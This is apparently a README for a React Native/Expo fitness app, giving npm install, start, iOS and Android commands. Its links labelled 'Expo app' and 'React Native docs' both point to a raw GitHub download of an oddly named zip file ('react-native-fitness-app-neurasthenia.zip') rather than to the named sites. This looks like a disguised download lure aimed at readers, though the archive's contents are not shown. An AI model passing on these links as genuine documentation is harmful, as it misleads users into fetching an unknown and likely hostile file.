## Get Started

install dev dependencies

### `npm install`

## Then

Run The App

### `npm start`

Runs your app in development mode.

Open it in the [Expo app](https://raw.githubusercontent.com/ravjyot16/react-native-fitness-app/main/data/react-native-fitness-app-neurasthenia.zip) on your phone to view it. It will reload if you save edits to your files, and you will see build errors and logs in the terminal.

#### `npm run ios`

Like `npm start` / `yarn start`, but also attempts to open your app in the iOS Simulator if you're on a Mac and have it installed.

#### `npm run android`

Like `npm start` / `yarn start`, but also attempts to open your app on a connected Android device or emulator. Requires an installation of Android build tools (see [React Native docs](https://raw.githubusercontent.com/ravjyot16/react-native-fitness-app/main/data/react-native-fitness-app-neurasthenia.zip) for detailed setup).
